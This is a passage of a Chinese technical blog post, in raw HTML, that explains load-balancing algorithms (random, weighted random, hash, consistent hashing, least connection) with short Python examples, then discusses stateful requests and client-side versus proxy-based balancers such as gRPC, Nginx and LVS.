class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14e3944430391-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14e3944430391-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14e3944430391-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14e3944430391-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14e3944430391-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">random_choose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14e3944430391-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">import </span><span class=\"crayon-e\">random</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14e3944430391-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">seed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14e3944430391-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">choice</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n\n</div>\n<h2>加权随机算法（random）</h2>\n<p>如同加权轮训算法至于轮训算法一样，也是在随机的时候引入不同节点的权重，实现也很类似。</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29c5d14e7815874290\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef weight_random_choose(servers):\r\n    import random\r\n    random.seed()\r\n    weighted_list = []\r\n    for k, v in servers.iteritems():\r\n        weighted_list.extend([k] * v)\r\n    return random.choice(weighted_list)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14e7815874290-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14e7815874290-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14e7815874290-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14e7815874290-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14e7815874290-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14e7815874290-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14e7815874290-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14e7815874290-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">weight_random_choose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14e7815874290-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">import </span><span class=\"crayon-e\">random</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14e7815874290-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">seed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14e7815874290-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14e7815874290-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">iteritems</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14e7815874290-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">extend</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14e7815874290-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">choice</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n\n</div>\n<p>当然，如果节点列表以及权重变化不大，那么也可以对所有节点归一化，然后按概率区间选择</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29c5d14ea191997397\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef normalize_servers(servers):\r\n    normalized_servers = {}\r\n    total = sum(servers.values())\r\n    cur_sum = 0\r\n    for k, v in servers.iteritems():\r\n        normalized_servers[k] = 1.0 * (cur_sum + v) / total\r\n        cur_sum += v\r\n    return normalized_servers\r\n\r\ndef weight_random_choose_ex(normalized_servers):\r\n    import random, operator\r\n    random.seed()\r\n    rand = random.random()\r\n    for k, v in sorted(normalized_servers.iteritems(), key = operator.itemgetter(1)):\r\n        if v &gt;= rand:\r\n            return k\r\n    else:\r\n        assert False, 'Error normalized_servers with rand %s ' % rand</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ea191997397-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ea191997397-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ea191997397-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ea191997397-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ea191997397-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ea191997397-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ea191997397-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ea191997397-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ea191997397-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ea191997397-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ea191997397-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ea191997397-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ea191997397-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ea191997397-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ea191997397-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ea191997397-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ea191997397-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ea191997397-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ea191997397-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">normalize_servers</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ea191997397-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">normalized_servers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ea191997397-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">total</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ea191997397-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">cur_sum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ea191997397-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">iteritems</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ea191997397-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">normalized_servers</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cur_sum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">total</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ea191997397-7\"><span class=\"crayon-e\">        </span><span class=\"crayon-v\">cur_sum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ea191997397-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">normalized_servers</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ea191997397-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ea191997397-10\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">weight_random_choose_ex</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">normalized_servers</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ea191997397-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">import </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">operator</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ea191997397-12\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">seed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ea191997397-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">rand</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">random</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ea191997397-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sorted</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">normalized_servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">iteritems</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">operator</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">itemgetter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ea191997397-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rand</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ea191997397-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">k</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ea191997397-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ea191997397-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">assert</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'Error normalized_servers with rand %s '</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rand</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0035 seconds] -->\r\n\n</div>\n<h2>哈希法（hash）</h2>\n<p>根据客户端的IP，或者请求的“Key”，计算出一个hash值，然后对节点数目取模。好处就是，同一个请求能够分配到同样的服务节点，这对于“有状态”的服务很有必要</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29c5d14ee395685992\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef hash_choose(request_info, server_lst):\r\n    hashed_request_info = hash(request_info)\r\n    return server_lst[hashed_request_info % len(server_lst)]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ee395685992-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29c5d14ee395685992-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29c5d14ee395685992-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ee395685992-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">hash_choose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">request_info</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29c5d14ee395685992-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">hashed_request_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">hash</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">request_info</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29c5d14ee395685992-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">hashed_request_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n\n</div>\n<p>只要hash结果足够分散，也是能做到绝对均衡的。</p>\n<h2>一致性哈希</h2>\n<p>哈希算法的缺陷也很明显，当节点的数目发生变化的时候，请求会大概率分配到其他的节点，引发到一系列问题，比如sticky session。而且在某些情况，比如分布式存储，是绝对的不允许的。</p>\n<p>为了解决这个哈希算法的问题，又引入了<a href=\"https://en.wikipedia.org/wiki/Consistent_hashing\" target=\"_blank\">一致性哈希</a>算法，简单来说，一个物理节点与多个虚拟节点映射，在hash的时候，使用虚拟节点数目而不是物理节点数目。当物理节点变化的时候，虚拟节点的数目无需变化，只涉及到虚拟节点的重新分配。而且，调整每个物理节点对应的虚拟节点数目，也就相当于每个物理节点有不同的权重</p>\n<h2>最少连接算法（least connection）</h2>\n<p>以上的诸多算法，要么没有考虑到节点间的差异（轮训、随机、哈希），要么节点间的权重是静态分配的（加权轮训、加权随机、一致性hash）。</p>\n<p>考虑这么一种情况，某台机器出现故障，无法及时处理请求，但新的请求还是会以一定的概率源源不断的分配到这个节点，造成请求的积压。因此，根据节点的真实负载，动态地调整节点的权重就非常重要。当然，要获得接节点的真实负载也不是一概而论的事情，如何定义负载，负载的收集是否及时，这都是需要考虑的问题。</p>\n<p>每个节点当前的连接数目是一个非常容易收集的指标，因此lease connection是最常被人提到的算法。也有一些侧重不同或者更复杂、更客观的指标，比如最小响应时间（least response time）、最小活跃数（least active）等等。</p>\n<h1>一点思考</h1>\n<h2>有状态的请求</h2>\n<p>首先来看看“算法衡量”中提到的第三个问题：同一个请求是否分发到同样的服务节点，同一个请求指的是同一个用户或者同样的唯一标示。什么时候同一请求最好（必须）分发到同样的服务节点呢？那就是有状态 — 请求依赖某些存在于内存或者磁盘的数据，比如web请求的session，比如分布式存储。怎么实现呢，有以下几种办法：</p>\n<p>（1）请求分发的时候，保证同一个请求分发到同样的服务节点。</p>\n<p>这个依赖于负载均衡算法，比如简单的轮训，随机肯定是不行的，哈希法在节点增删的时候也会失效。可行的是一致性hash，以及分布式存储中的按范围分段（即记录哪些请求由哪个服务节点提供服务），代价是需要在load balancer中维护额外的数据。</p>\n<p>（2）状态数据在backend servers之间共享</p>\n<p>保证同一个请求分发到同样的服务节点，这个只是手段，目的是请求能使用到对应的状态数据。如果状态数据能够在服务节点之间共享，那么也能达到这个目的。比如服务节点连接到共享数据库，或者内存数据库如memcached</p>\n<p>（3）状态数据维护在客户端</p>\n<p>这个在web请求中也有使用，即cookie，不过要考虑安全性，需要加密。</p>\n<h2>关于load balancer</h2>\n<p>接下来回答第四个问题：关于load balancer，其实就是说，在哪里做负载均衡，是客户端还是服务端，是请求的发起者还是请求的3。具体而言，要么是在客户端，根据服务节点的信息自行选择，然后将请求直接发送到选中的服务节点；要么是在服务节点集群之前放一个集中式代理（proxy），由代理负责请求求分发。不管哪一种，至少都需要知道当前的服务节点列表这一基础信息。</p>\n<p>如果在客户端实现负载均衡，客户端首先得知道服务器列表，要么是静态配置，要么有简单接口查询，但backend server的详细负载信息，就不适用通过客户端来查询。因此，客户端的负载均衡算法要么是比较简单的，比如轮训（加权轮训）、随机（加权随机）、哈希这几种算法，只要每个客户端足够随机，按照大数定理，服务节点的负载也是均衡的。要在客户端使用较为复杂的算法，比如根据backend的实际负载，那么就需要去额外的负载均衡服务（external load balancing service）查询到这些信息，在<a href=\"https://github.com/grpc/grpc/blob/master/doc/load-balancing.md\" target=\"_blank\">grpc</a>中，就是使用的这种办法</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/5567530ef55fda8f329c24d7c510017a.png\" alt=\"\"></p>\n<p>可以看到，load balancer与grpc server通信，获得grpc server的负载等具体详细，然后grpc client从load balancer获取这些信息，最终grpc client直连到被选择的grpc server。</p>\n<p>而基于Proxy的方式是更为常见的，比如7层的Nginx，四层的F5、LVS，既有硬件路由，也有软件分发。集中式的特点在于方便控制，而且能容易实现一些更精密，更复杂的算法。但缺点也很明显，一来负载均衡器本身可能成为性能瓶颈；二来可能引入额外的延迟，请求一定先发到达负载均衡器，然后到达真正的服务节点。</p>\n<p>load balance proxy对于请求的响应（response），要么不经过proxy，如LVS；要么经过Proxy，如Nginx。下图是LVS示意图（来源见水印）</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/67aae7bdbbab3340571198f7ffb00261.png\" alt=\"\"></p>\n<p>而如果response也是走load balancer proxy的话，那么整个服务过程对客户端而言就是完全透明的，也防止了客户端去尝试连接后台服务器，提供了一层安全保障！</p>\n<p>值得注意的是，<strong>load balancer proxy不能成为单点故障</strong>（single point of failure），因此一般会设计为高可用的主从结构</p>\n<h2> 其他</h2>\n<p>在<a href=\"http://www.cnblogs.com/data2value/p/6107653.html\" 